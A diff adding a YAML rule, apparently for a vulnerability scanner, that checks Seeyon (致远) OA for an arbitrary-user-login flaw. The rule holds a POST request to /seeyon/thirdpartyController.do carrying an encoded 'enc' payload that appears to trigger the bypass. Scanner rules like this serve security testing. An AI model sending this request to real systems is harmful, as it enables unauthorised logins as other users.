@@ -1,0 +1,11 @@
+models:
+  - YONYOU:
+    info: "致远OA-任意用户登录漏洞"
+    cveid: ""
+    reference: ""
+    method: "POST"
+    status: true
+    url: "/seeyon/thirdpartyController.do"
+    keys:
+      method: "access"
+      enc: "$_BT_STARTTT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4"
